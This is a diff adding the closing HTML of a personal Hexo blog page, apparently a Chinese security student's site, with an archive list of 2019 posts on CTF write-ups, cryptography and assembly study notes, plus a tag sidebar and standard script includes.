+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span><a class="archive-post-title" href="/2019/07/20/2019.07.20（74）/">乘法链算法的实现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href="/2019/07/18/2019.07.18（73）/">最小公倍数的加法算法实现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/15</span><a class="archive-post-title" href="/2019/07/15/2019.07.15（72）/">欧几里得算法的实现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/13</span><a class="archive-post-title" href="/2019/07/13/2019.07.13（71）/">《软件安全分析与应用》第 2 章：基础知识学习笔记(1)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/12</span><a class="archive-post-title" href="/2019/07/12/2019.07.12（70）/">《软件安全分析与应用》第 1 章：绪论学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/16</span><a class="archive-post-title" href="/2019/06/16/2019.06.16（69）/">《图解密码技术》第三章（对称密码）学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/15</span><a class="archive-post-title" href="/2019/06/15/2019.06.15（68）/">《图解密码技术》第二章（历史上的密码）学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/14</span><a class="archive-post-title" href="/2019/06/14/2019.06.14（67）/">《图解密码技术》第一章（环游密码世界）学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/03</span><a class="archive-post-title" href="/2019/06/03/2019.06.03（66）/">《图解密码技术》第十五章（密码技术和现实生活）学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/01</span><a class="archive-post-title" href="/2019/06/01/2019.06.01（65）/">《图解密码技术》第十四章（SSL/TSL）学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/2019/05/29/2019.05.29（64）/">《图解密码技术》第十三章（PGP）学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/28</span><a class="archive-post-title" href="/2019/05/28/2019.05.28（63）/">《图解密码技术》第十二章（随机数）学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/25</span><a class="archive-post-title" href="/2019/05/25/2019.05.25（62）/">MySQL学习笔记（二）查询(2)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/23</span><a class="archive-post-title" href="/2019/05/23/2019.05.23（61）/">《图解密码技术》第十一章学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/2019/05/21/2019.05.21（60）/">《图解密码技术》第十章学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/20</span><a class="archive-post-title" href="/2019/05/20/2019.05.20（59）/">《图解密码技术》第九章学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/16</span><a class="archive-post-title" href="/2019/05/16/2019.05.16（58）/">《图解密码技术》第八章学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/15</span><a class="archive-post-title" href="/2019/05/15/2019.05.15（57）/">304号测试解题总结（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/14</span><a class="archive-post-title" href="/2019/05/14/2019.05.14（56）/">本科毕业论文问卷调查</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/13</span><a class="archive-post-title" href="/2019/05/13/2019.05.13（55）/">304号测试学习笔记（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/11</span><a class="archive-post-title" href="/2019/05/11/2019.05.11（54）/">《图解密码技术》第七章学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/09</span><a class="archive-post-title" href="/2019/05/09/2019.05.09（53）/">Wiener Trick解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/07</span><a class="archive-post-title" href="/2019/05/07/2019.05.07（52）/">Wiener Trick解题准备</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/05</span><a class="archive-post-title" href="/2019/05/05/2019.05.05（51）/">MySQL学习笔记（一）查询(1)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/29</span><a class="archive-post-title" href="/2019/04/29/2019.04.29（50）/">Misc：RealWiFi解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/28</span><a class="archive-post-title" href="/2019/04/28/2019.04.28（49）/">Another 01game解题详细总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/27</span><a class="archive-post-title" href="/2019/04/27/2019.04.27（48）/">Python 学习笔记（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/26</span><a class="archive-post-title" href="/2019/04/26/2019.04.26（47）/">初识 Caesar 密码</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/25</span><a class="archive-post-title" href="/2019/04/25/2019.04.25（46）/">二进制炸弹：Phase_6解题总结（1）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/23</span><a class="archive-post-title" href="/2019/04/23/2019.04.23（45）/">二进制炸弹：Phase_5解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/22</span><a class="archive-post-title" href="/2019/04/22/2019.04.22（44）/">sscanf()函数的详细总结 + 实例</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/21</span><a class="archive-post-title" href="/2019/04/21/2019.04.21（43）/">二进制炸弹：Phase_4解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span><a class="archive-post-title" href="/2019/04/20/2019.04.20（42）/">二进制炸弹：Phase_3解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href="/2019/04/19/2019.04.19（41）/">二进制炸弹：Phase_2解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/18</span><a class="archive-post-title" href="/2019/04/18/2019.04.18（40）/">二进制炸弹：Phase_1解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span><a class="archive-post-title" href="/2019/04/17/2019.04.17（39）/">二进制炸弹解题知识储备</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/16</span><a class="archive-post-title" href="/2019/04/16/2019.04.16（38）/">《汇编语言程序设计》学习笔记（十）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/15</span><a class="archive-post-title" href="/2019/04/15/2019.04.15（37）/">reverse：Reverse sign in解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/14</span><a class="archive-post-title" href="/2019/04/14/2019.04.14（36）/">《汇编语言程序设计》学习笔记（九）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/13</span><a class="archive-post-title" href="/2019/04/13/2019.04.13（35）/">Crypto：RSA详细总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/12</span><a class="archive-post-title" href="/2019/04/12/2019.04.12（34）/">《汇编语言程序设计》学习笔记（八）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/10</span><a class="archive-post-title" href="/2019/04/10/2019.04.10（33）/">Crypto：RSA2解题总结（二）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/09</span><a class="archive-post-title" href="/2019/04/09/2019.04.09（32）/">Crypto：RSA2解题总结（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/08</span><a class="archive-post-title" href="/2019/04/08/2019.04.08（31）/">openssl学习笔记（二）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/07</span><a class="archive-post-title" href="/2019/04/07/2019.04.07（30）/">openssl学习笔记（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/05</span><a class="archive-post-title" href="/2019/04/05/2019.04.05（29）/">Crypto：What's RSA？解题总结（2）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href="/2019/04/04/2019.04.04（28）/">《汇编语言程序设计》学习笔记（七）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/03</span><a class="archive-post-title" href="/2019/04/03/2019.04.03（27）/">《汇编语言程序设计》学习笔记（六）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/02</span><a class="archive-post-title" href="/2019/04/02/2019.04.02（26）/">《汇编语言程序设计》学习笔记（五）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/01</span><a class="archive-post-title" href="/2019/04/01/2019.04.01（25）/">《汇编语言程序设计》学习笔记（四）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/19</span><a class="archive-post-title" href="/2019/03/19/2019.03.19（24）/">复试进度总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/18</span><a class="archive-post-title" href="/2019/03/18/2019.03.18（23）/">复试复习总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/17</span><a class="archive-post-title" href="/2019/03/17/2019.03.17（22）/">《保密概论》总知识点提纲</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/16</span><a class="archive-post-title" href="/2019/03/16/2019.03.16（21）/">《保密概论》第6、7章知识点提纲</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/14</span><a class="archive-post-title" href="/2019/03/14/2019.03.14（20）/">《保密概论》前五章知识点提纲</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/13</span><a class="archive-post-title" href="/2019/03/13/2019.03.13（19）/">《汇编语言程序设计》学习笔记（三）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/12</span><a class="archive-post-title" href="/2019/03/12/2019.03.12（18）/">《汇编语言程序设计》学习笔记（二）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/11</span><a class="archive-post-title" href="/2019/03/11/2019.03.11（17）/">《汇编语言程序设计》学习笔记（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/10</span><a class="archive-post-title" href="/2019/03/10/2019.03.10（16）/">Binary Bombs——汇编语言学习总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/09</span><a class="archive-post-title" href="/2019/03/09/2019.03.09（15）/">正则表达式总结（1）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/08</span><a class="archive-post-title" href="/2019/03/08/2019.03.08（14）/">Web：Calculator解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/07</span><a class="archive-post-title" href="/2019/03/07/2019.03.07（13）/">Misc：Invisible flag解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/06</span><a class="archive-post-title" href="/2019/03/06/2019.03.06（12）/">学习总结（1）：隐写术</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/05</span><a class="archive-post-title" href="/2019/03/05/2019.03.05（11）/">Misc：Forensics2解题总结 + 学习总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2019/03/04/2019.03.04（10）/">Misc：PkCrack解题总结 + 学习总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/03</span><a class="archive-post-title" href="/2019/03/03/2019.03.03（9）/">Misc：shell解题总结 + 学习总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href="/2019/03/02/2019.03.02（8）/">Misc：Exif 解题总结 + 学习总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/2019.03.01（7）/">Misc：Forensics1 解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/28</span><a class="archive-post-title" href="/2019/02/28/2019.02.28（6）/">Crypto：What's RSA？解题总结（1）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/27</span><a class="archive-post-title" href="/2019/02/27/2019.02.27（5）/">Misc:LSB解题总结+学习总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span><a class="archive-post-title" href="/2019/02/26/2019.02.26（4）/">Misc:docx解题过程+学习总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/25</span><a class="archive-post-title" href="/2019/02/25/2019.02.25（3）/">创建Github+Hexo个人博客总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2019.02.24（2）/">Misc:Signin/Misc:Poem/Misc:Birthday解题总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href="/2019/02/23/2019.02.23（1）/">《So you want to work in security》”读后感</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="解题总结"><span class="iconfont-archer">&#xe606;</span>解题总结</span>
+    
+        <span class="sidebar-tag-name" data-tags="RSA"><span class="iconfont-archer">&#xe606;</span>RSA</span>
+    
+        <span class="sidebar-tag-name" data-tags="汇编语言"><span class="iconfont-archer">&#xe606;</span>汇编语言</span>
+    
+        <span class="sidebar-tag-name" data-tags="研究生复试"><span class="iconfont-archer">&#xe606;</span>研究生复试</span>
+    
+        <span class="sidebar-tag-name" data-tags="《保密概论》"><span class="iconfont-archer">&#xe606;</span>《保密概论》</span>
+    
+        <span class="sidebar-tag-name" data-tags="kali"><span class="iconfont-archer">&#xe606;</span>kali</span>
+    
+        <span class="sidebar-tag-name" data-tags="二进制"><span class="iconfont-archer">&#xe606;</span>二进制</span>
+    
+        <span class="sidebar-tag-name" data-tags="基础知识"><span class="iconfont-archer">&#xe606;</span>基础知识</span>
+    
+        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
+    
+        <span class="sidebar-tag-name" data-tags="MySQL"><span class="iconfont-archer">&#xe606;</span>MySQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="Misc"><span class="iconfont-archer">&#xe606;</span>Misc</span>
+    
+        <span class="sidebar-tag-name" data-tags="本科论文"><span class="iconfont-archer">&#xe606;</span>本科论文</span>
+    
+        <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
+    
+        <span class="sidebar-tag-name" data-tags="《图解密码技术》学习笔记"><span class="iconfont-archer">&#xe606;</span>《图解密码技术》学习笔记</span>
+    
+        <span class="sidebar-tag-name" data-tags="Virtual machine"><span class="iconfont-archer">&#xe606;</span>Virtual machine</span>
+    
+        <span class="sidebar-tag-name" data-tags="《软件安全分析与应用》"><span class="iconfont-archer">&#xe606;</span>《软件安全分析与应用》</span>
+    
+        <span class="sidebar-tag-name" data-tags="密码算法"><span class="iconfont-archer">&#xe606;</span>密码算法</span>
+    
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+    
+        <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
+    
+        <span class="sidebar-tag-name" data-tags="XCTF"><span class="iconfont-archer">&#xe606;</span>XCTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="PHP"><span class="iconfont-archer">&#xe606;</span>PHP</span>
+    
+        <span class="sidebar-tag-name" data-tags="JavaScritpt"><span class="iconfont-archer">&#xe606;</span>JavaScritpt</span>
+    
+        <span class="sidebar-tag-name" data-tags="fuzz"><span class="iconfont-archer">&#xe606;</span>fuzz</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwnable.kr"><span class="iconfont-archer">&#xe606;</span>pwnable.kr</span>
+    
+        <span class="sidebar-tag-name" data-tags="区块链"><span class="iconfont-archer">&#xe606;</span>区块链</span>
+    
+        <span class="sidebar-tag-name" data-tags="智能合约漏洞"><span class="iconfont-archer">&#xe606;</span>智能合约漏洞</span>
+    
+        <span class="sidebar-tag-name" data-tags="reverse"><span class="iconfont-archer">&#xe606;</span>reverse</span>
+    
+        <span class="sidebar-tag-name" data-tags="密码学"><span class="iconfont-archer">&#xe606;</span>密码学</span>
+    
+        <span class="sidebar-tag-name" data-tags="内核"><span class="iconfont-archer">&#xe606;</span>内核</span>
+    
+        <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "MUZIBing"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+        <div class="site-search">
+  <div class="algolia-popup popup">
+    <div class="algolia-search">
+      <div class="algolia-search-input-icon">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="algolia-search-input" id="algolia-search-input"></div>
+    </div>
+
+    <div class="algolia-results">
+      <div id="algolia-stats"></div>
+      <div id="algolia-hits"></div>
+      <div id="algolia-pagination" class="algolia-pagination"></div>
+    </div>
+
+    <span class="popup-btn-close">
+      <i class="iconfont-archer">&#xe609;</i>
+    </span>
+  </div>
+</div>
+        <script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.8.0/dist/instantsearch.min.js" defer></script>
+        <script src="/scripts/search.js" defer></script>
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
+</html>
+
+
